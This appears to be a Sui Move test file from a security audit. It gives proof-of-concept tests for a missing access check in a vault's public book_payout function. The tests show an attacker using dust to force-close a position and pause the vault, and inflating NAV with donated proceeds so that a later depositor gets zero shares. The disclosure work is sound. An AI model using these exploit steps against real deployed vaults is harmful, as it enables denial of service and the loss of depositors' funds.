#[test_only]
// PoC for Finding 4421 (H2): `yosuku_vault::book_payout` is public and has no
// auth/sender check (unlike the admin functions at :322/331/339/345 which call
// `assert_admin`). It removes the leg from `liabilities`, debits
// `total_open_cost` by the leg's full `cost_basis`, joins the caller-supplied
// `proceeds` to idle, and books realized loss `cost_basis - proceeds` with no
// lower bound on proceeds.
//
// Two consequences demonstrated below:
//   (1) DoS: anyone with 1 base unit dust calls book_payout on the agent's
//       open leg with proceeds = 1. The leg is force-closed, NAV drops, the
//       recorded loss trips the circuit breaker and pauses the vault.
//   (2) NAV inflation via donated proceeds: an attacker opens a tiny leg,
//       then calls book_payout on it with a large donated proceeds to inflate
//       NAV — later depositors receive zero shares via mul_div round-down.
module suioverflow::audit_poc_4421_tests;

use sui::{
    clock::{Self, Clock},
    coin,
    test_scenario as ts,
};
use std::unit_test::{assert_eq, destroy};
use suioverflow::{
    attestation_verifier,
    bell_share::{Self, BELL_SHARE},
    yosuku_vault::{Self, Vault},
};

public struct TUSD has drop {}

const ADMIN: address = @0xAD;
const AGENT: address = @0xA6E;
const ATTACKER: address = @0xE7;
const VICTIM: address = @0xB0B;
const STRIKE: u64 = 63_000_000_000_000;
const EXPIRY: u64 = 1_700_000_000_000;
const QTY: u64 = 1_000_000;
const COST: u64 = 480_000;
const NONCE: u64 = 1;
const ISSUED: u64 = 500;

#[test_only]
fun oracle(): ID { object::id_from_address(@0xC0FFEE) }

#[test_only]
fun setup(s: &mut ts::Scenario): (Clock, Vault<TUSD>) {
    let clk = clock::create_for_testing(s.ctx());
    let treasury = bell_share::new_treasury_for_testing(s.ctx());
    let v = yosuku_vault::open<TUSD>(treasury, AGENT, 5000, 1_000_000, 100_000, &clk, s.ctx());
    (clk, v)
}

#[test_only]
fun fund(v: &mut Vault<TUSD>, amount: u64, s: &mut ts::Scenario): coin::Coin<BELL_SHARE> {
    let c = coin::mint_for_testing<TUSD>(amount, s.ctx());
    yosuku_vault::deposit(v, c, s.ctx())
}

#[test_only]
fun open_leg(v: &mut Vault<TUSD>, clk: &Clock, s: &mut ts::Scenario) {
    let o = oracle();
    yosuku_vault::set_oracle_allowed(v, o, true, s.ctx());
    let vid = object::id(v);
    let digest = yosuku_vault::predict_digest_for_testing(vid, o, STRIKE, EXPIRY, QTY, 0, 1, NONCE, ISSUED, b"ih");
    let verified = attestation_verifier::new_verified_for_testing(AGENT, digest, NONCE);
    let (ticket, coin) = yosuku_vault::begin_predict_action(
        v, verified, o, EXPIRY, STRIKE, 0, QTY, COST, digest, ISSUED, b"ih", clk, s.ctx(),
    );
    destroy(coin); // funds "leave" for the predict mint in the agent's PTB
    yosuku_vault::confirm_predict_action(v, ticket, 0, clk);
}

/// DoS path: an attacker who holds 1 base unit of TUSD calls book_payout on
/// the agent's open leg. The leg is force-removed, NAV drops by COST-1, the
/// recorded loss trips the circuit breaker, and the vault is paused.
#[test]
fun poc_4421_dust_book_payout_force_closes_leg_and_trips_breaker() {
    let mut s = ts::begin(ADMIN);
    let (clk, mut v) = setup(&mut s);
    let shares_admin = fund(&mut v, 1_000_000, &mut s);
    open_leg(&mut v, &clk, &mut s);

    let o = oracle();
    // Sanity: the leg exists, idle = 1M - COST, total_open_cost = COST.
    assert_eq!(yosuku_vault::leg_qty(&v, o, EXPIRY, STRIKE, 0), QTY);
    assert_eq!(yosuku_vault::total_open_cost(&v), COST);
    assert_eq!(yosuku_vault::idle_value(&v), 1_000_000 - COST);
    assert!(!yosuku_vault::is_paused(&v));

    // ATTACKER (anyone) mints 1 base unit of dust and calls the public,
    // unauthenticated book_payout on the agent's leg.
    s.next_tx(ATTACKER);
    let dust = coin::mint_for_testing<TUSD>(1, s.ctx());
    yosuku_vault::book_payout(&mut v, dust, &clk, o, EXPIRY, STRIKE, 0, 0);

    // The leg was force-removed by a stranger.
    assert_eq!(yosuku_vault::leg_qty(&v, o, EXPIRY, STRIKE, 0), 0);
    // total_open_cost was debited by the full cost_basis.
    assert_eq!(yosuku_vault::total_open_cost(&v), 0);
    // Idle got 1 unit of proceeds (the dust) back — net NAV drop = COST - 1.
    assert_eq!(yosuku_vault::idle_value(&v), 1_000_000 - COST + 1);
    // Realized loss = COST - 1 = 479_999 >> daily_loss_limit (100_000) ⇒ breaker trips.
    assert_eq!(yosuku_vault::realized_loss_today(&v), COST - 1);
    assert!(yosuku_vault::is_paused(&v));

    destroy(shares_admin);
    destroy(v);
    destroy(clk);
    s.end();
}

/// Theft / NAV-inflation path: an attacker opens a tiny leg via the legitimate
/// agent flow (or capitalizes on any open leg) and then calls book_payout on it
/// with a HUGE donated proceeds (D >> C). This inflates NAV per share; later
/// depositors who deposit small amounts receive ZERO shares via the
/// `mul_div` round-down in `deposit`. (We demonstrate the NAV inflation
/// directly: total_assets jumps by D - cost_basis.)
#[test]
fun poc_4421_donated_proceeds_inflates_nav() {
    let mut s = ts::begin(ADMIN);
    let (clk, mut v) = setup(&mut s);
    let shares_admin = fund(&mut v, 1_000_000, &mut s);
    open_leg(&mut v, &clk, &mut s);

    let o = oracle();
    let nav_before = yosuku_vault::nav(&v); // 1_000_000 (idle + cost basis unchanged at open)

    // ATTACKER donates a large proceeds D = 5_000_000 (>> COST = 480_000) on the
    // agent's leg. book_payout accepts it without question.
    s.next_tx(ATTACKER);
    let donated = coin::mint_for_testing<TUSD>(5_000_000, s.ctx());
    yosuku_vault::book_payout(&mut v, donated, &clk, o, EXPIRY, STRIKE, 0, 0);

    // NAV is inflated by 5_000_000 - COST = 4_520_000 (leg removed at full cost_basis,
    // 5M proceeds joined). Recorded "loss" is negative in spirit — realized_loss stays 0
    // because proceeds(5M) > cost_basis(480k) so is_loss = false.
    let nav_after = yosuku_vault::nav(&v);
    assert_eq!(nav_after, nav_before + 5_000_000 - COST);
    assert_eq!(yosuku_vault::realized_loss_today(&v), 0);
    assert!(!yosuku_vault::is_paused(&v));

    // Now a NEW victim deposits 1 base unit. mul_div(amount=1, supply, nav_after)
    // with nav_after >> supply rounds DOWN to 0 shares — the victim donates for free.
    s.next_tx(VICTIM);
    let tiny = coin::mint_for_testing<TUSD>(1, s.ctx());
    let victim_shares = yosuku_vault::deposit(&mut v, tiny, s.ctx());
    assert_eq!(victim_shares.value(), 0); // mul_div round-down ⇒ 0 shares minted
    destroy(victim_shares);

    destroy(shares_admin);
    destroy(v);
    destroy(clk);
    s.end();
}
